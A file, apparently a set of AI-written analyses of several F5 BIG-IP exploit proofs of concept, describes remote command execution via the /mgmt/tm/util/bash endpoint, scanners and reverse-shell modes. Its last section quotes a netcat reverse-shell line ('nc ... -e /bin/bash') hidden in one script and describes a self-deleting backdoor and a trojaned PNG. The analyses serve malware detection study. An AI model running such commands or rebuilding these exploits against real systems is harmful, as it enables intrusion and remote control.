@@ -1,0 +1,63 @@
+F5 Big-IP PoC 1 Output:
+This script is written in Python 3 and appears to be an exploit tool targeting a specific remote server vulnerability. Here's a breakdown of what the code does:
+Imports necessary libraries: argparse, requests, and urllib3.
+Disables SSL/TLS certificate warnings using urllib3.disable_warnings().
+Defines the exploit function that takes two arguments: target (the IP address of the target server) and command (the command to be executed on the target server).
+The function constructs a URL using the target IP and a specific path (/mgmt/tm/util/bash).
+It sets up headers for the HTTP request, including an Authorization header with a hardcoded Base64-encoded username and password, and a custom X-F5-Auth-Token header.
+The function sends an HTTP POST request to the URL using the requests library with the constructed headers and a JSON payload containing the command to be executed.
+It checks the response status code and content type, and if the conditions are met, it prints the result of the executed command. If the response does not meet the conditions, it prints a message indicating that the target is not vulnerable.
+The script uses argparse to define command-line arguments for the target IP and command to execute.
+It calls the exploit function with the provided command-line arguments.
+Please note that using or sharing exploit code for unauthorized access or other malicious purposes is illegal and unethical. Always obtain permission from the system owner before attempting any penetration testing or vulnerability assessment.
+
+
+
+
+
+
+F5 Big-IP PoC 2 Output:
+
+This Python script is a command-line utility that checks for a vulnerability on a target URL or a list of URLs, and optionally exploits the vulnerability by executing arbitrary commands or obtaining a reverse shell. The script imports several libraries and disables SSL warnings. The vulnerability appears to be related to the F5 BIG-IP platform, as it uses the /mgmt/tm/util/bash endpoint.
+Here's a breakdown of the script's functions:
+headers(): Returns a dictionary with HTTP headers for requests, including a user agent and an authentication token.
+check(target_url): Checks whether the target URL is vulnerable by sending a request to the /mgmt/tm/util/bash endpoint and checking the response.
+attack(target_url, cmd): Exploits the vulnerability by sending a request to the /mgmt/tm/util/bash endpoint with the specified command, and prints the result.
+reverse_shell(target_url, command): Attempts to obtain a reverse shell by sending a request to the /mgmt/tm/util/bash endpoint with the specified command.
+scan(file): Scans a list of URLs from the given file for the vulnerability by calling the check() function for each URL.
+format_url(url): Formats the input URL by adding "https://" if it's not present.
+main(): Parses command-line arguments and calls the appropriate functions based on the input.
+The script supports several modes:
+Verify mode (-v or --verify): Checks if a single URL is vulnerable.
+Attack mode (-a or --attack): Exploits the vulnerability on a single URL by executing a specified command.
+Scan mode (-s or --scan): Scans a list of URLs from a file for the vulnerability.
+Reverse shell mode (-r or --shell): Attempts to obtain a reverse shell on a single URL with a specified command.
+
+
+
+
+
+F5 Big-IP PoC 3 Output:
+This code is a Python script designed to test and exploit a target system with an F5 BIG-IP vulnerability. The script can perform the following actions:
+Test the vulnerability on the target system.
+Execute an interactive shell on the target system if it's vulnerable.
+The script uses the requests library to send HTTP requests and optparse to parse command-line options. It also disables SSL/TLS warnings from the urllib3 library.
+The script accepts the following command-line options:
+-u, --url: The IP address of the target system.
+-t, --test: Test the vulnerability on the target system.
+-s, --shell: Run an interactive shell if the target is vulnerable.
+If no options are provided, the script tests the vulnerability on the target system. If -t or --test is provided, it tests the vulnerability. If -s or --shell is provided, it runs an interactive shell if the target is vulnerable.
+The main functions of the script are:
+test_expl(): Tests the vulnerability on the target system by sending an HTTP POST request with a crafted JSON payload and headers. If the response indicates the target is vulnerable, it prints a message and provides the option to run an interactive shell with the -s option.
+getPS1(): Retrieves the command prompt (PS1) for the target system by sending an HTTP POST request with a crafted JSON payload and headers. This is used to display the command prompt when running the interactive shell.
+cmdExec(): Runs an interactive shell on the target system by sending HTTP POST requests with crafted JSON payloads and headers containing user input commands. The output of the executed commands is displayed.
+In summary, this Python script tests and potentially exploits a vulnerability in F5 BIG-IP systems. It can test the vulnerability and run an interactive shell on vulnerable systems.
+
+F5 Big-IP Malicious Output:
+Based on the provided code, this script attempts to exploit a remote server vulnerability to gain root access. Apart from that, there is an additional malicious behavior:
+The script is using a reverse shell to establish a connection with a specified IP and port using netcat (nc) and executing /bin/bash. This allows the attacker to remotely control the target system:
+python
+os.system("nc " + str(args.ip) + " " + str(args.port) + " -e /bin/bash 2>/dev/null &")
+It creates a malicious Python script under the "/tmp/plugin" file, which will attempt to open a reverse shell to the provided IP and port. The script also has a self-deletion mechanism for covering its tracks.
+The script creates a new file named "binwalk_exploit.png" by concatenating the input .png file, a malicious payload header, and the content of the malicious plugin script. This new file could be used to further propagate the attack.
+In conclusion, this script not only exploits a remote server vulnerability to gain root access but also opens a reverse shell for remote control and creates a malicious payload file for further propagation.
